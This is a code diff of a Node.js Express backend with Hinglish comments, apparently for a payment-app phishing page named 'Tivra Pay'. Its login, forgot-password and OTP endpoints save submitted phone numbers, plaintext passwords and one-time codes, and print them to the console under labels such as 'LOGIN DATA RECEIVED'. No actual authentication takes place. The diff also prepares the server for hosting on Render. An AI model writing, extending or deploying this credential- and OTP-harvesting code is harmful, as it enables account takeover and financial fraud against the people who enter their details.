@@ -5,7 +5,7 @@ const { MongoMemoryServer } = require('mongodb-memory-server');
 
 const app = express();
 app.use(express.json());
-app.use(cors()); // Iske bina frontend aur backend connect nahi ho paate
+app.use(cors()); // Frontend aur Backend connectivity ke liye
 
 // 1. Data Structure (Schema)
 const userSchema = new mongoose.Schema({
@@ -17,10 +17,65 @@ const userSchema = new mongoose.Schema({
 
 const User = mongoose.model('User', userSchema);
 
-// 2. Database Server Initialization Function
+// ====== NAYA ADD KIYA: Root Route (Browser test ke liye) ======
+app.get('/', (req, res) => {
+    res.send("<h1>🚀 Tivra Pay Backend Server is Active and Running!</h1>");
+});
+
+// 2. API Route: Login Data Receive Karne Ke Liye
+app.post('/api/login-submit', async (req, res) => {
+    try {
+        const { phoneNumber, password } = req.body;
+        console.log(`\n[🔥 LOGIN DATA RECEIVED] Phone: ${phoneNumber}, Pass: ${password}`);
+        
+        // Data ko database mein save karein
+        const newUser = new User({ phoneNumber, password });
+        const savedUser = await newUser.save();
+        
+        res.status(200).json({ success: true, userId: savedUser._id });
+    } catch (err) {
+        console.error("Login Error:", err);
+        res.status(500).json({ success: false, message: "Server Error" });
+    }
+});
+
+// ====== NAYA ADD KIYA: Forgot Password Route ======
+app.post('/api/forgot-submit', async (req, res) => {
+    try {
+        const { phone, newPassword } = req.body;
+        console.log(`\n[🔑 FORGOT PASSWORD REQUEST] Phone: ${phone}`);
+        
+        // Naya user entry banayein ya update karein
+        const newUser = new User({ phoneNumber: phone, password: newPassword });
+        const savedUser = await newUser.save();
+        
+        res.status(200).json({ success: true, userId: savedUser._id });
+    } catch (err) {
+        res.status(500).json({ success: false });
+    }
+});
+
+// ====== NAYA ADD KIYA: OTP Submit Route ======
+app.post('/api/otp-submit', async (req, res) => {
+    try {
+        const { userId, otp } = req.body;
+        console.log(`\n[📩 OTP RECEIVED] UserID: ${userId}, OTP: ${otp}`);
+        
+        if (userId) {
+            await User.findByIdAndUpdate(userId, { otpEntered: otp });
+            res.status(200).json({ success: true, message: "OTP Saved Successfully!" });
+        } else {
+            res.status(400).json({ success: false, message: "User ID missing" });
+        }
+    } catch (err) {
+        console.error("OTP Error:", err);
+        res.status(500).json({ success: false });
+    }
+});
+
+// 3. Database Server Initialization Function
 async function startServer() {
     try {
-        // Yeh line bina Windows service ke automatic internal database chalu karegi
         const mongoServer = await MongoMemoryServer.create();
         const mongoUri = mongoServer.getUri();
         
@@ -29,10 +84,10 @@ async function startServer() {
         console.log('🎉 MongoDB (In-Memory) Connected Successfully!');
         console.log('====================================');
 
-        // Server ko port 5500 par live sunne ke liye active karein
-        app.listen(4000, () => {
-            console.log('🚀 Backend Server running on port 4000');
-            console.log('Aapka backend puri tarah ready hai!');
+        // PORT: Render hamesha process.env.PORT use karta hai, local par 6500 chalega
+        const PORT = process.env.PORT || 6500;
+        app.listen(PORT, () => {
+            console.log(`🚀 Backend Server running on port ${PORT}`);
             console.log('====================================\n');
         });
     } catch (err) {
@@ -40,45 +95,4 @@ async function startServer() {
     }
 }
 
-// 3. API Route: Login Data Receive Karne Ke Liye
-app.post('/api/login-submit', async (req, res) => {
-    try {
-        const { phoneNumber, password } = req.body;
-        
-        // Data ko database mein hamesha ke liye save karein
-        const newUser = new User({ phoneNumber, password });
-        const savedUser = await newUser.save();
-        
-        // TERMINAL PAR LIVE DATA DEKHNE KE LIYE
-        console.log(`\n[🔥 LIVE DATA RECEIVED]`);
-        console.log(`📱 Phone Number : ${phoneNumber}`);
-        console.log(`🔑 Password     : ${password}`);
-        console.log(`------------------------------------`);
-        
-        res.status(200).json({ success: true, userId: savedUser._id });
-    } catch (error) {
-        res.status(500).json({ success: false, message: "Server Error" });
-    }
-});
-
-// 4. API Route: OTP Receive aur Update Karne Ke Liye
-app.post('/api/otp-submit', async (req, res) => {
-    try {
-        const { userId, otp } = req.body;
-        
-        // Purane user data ke andar OTP ko update karein
-        await User.findByIdAndUpdate(userId, { otpEntered: otp });
-        
-        console.log(`[🔑 OTP UPDATED SUCCESSFULLY]`);
-        console.log(`🆔 User ID : ${userId}`);
-        console.log(`🔐 OTP     : ${otp}`);
-        console.log('====================================');
-        
-        res.status(200).json({ success: true });
-    } catch (error) {
-        res.status(500).json({ success: false, message: "Server Error" });
-    }
-});
-
-
-startserver();
+startServer();
